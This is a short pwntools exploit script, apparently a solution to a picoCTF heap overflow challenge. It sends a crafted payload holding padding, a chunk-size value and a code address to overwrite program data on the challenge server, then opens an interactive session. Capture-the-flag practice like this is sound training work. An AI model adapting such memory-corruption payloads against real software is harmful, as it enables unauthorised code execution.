from pwn import * 

exe = ELF("./chall")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mimas.picoctf.net", 51195)

    return r

def main():
	r = conn()
	input()
	r.recvuntil(b"Enter your choice: ")
	r.sendline(b'2')
	# pause()
	payload = p64(0x6f636970) + p64(0)*2 +p64(0x21) + p32(0x4011a0)
	r.sendlineafter(b'Data for buffer: ', payload)
	r.sendlineafter(b"Enter your choice: ", b'4')
	# pause()
	r.interactive()
if __name__ == "__main__":
	main()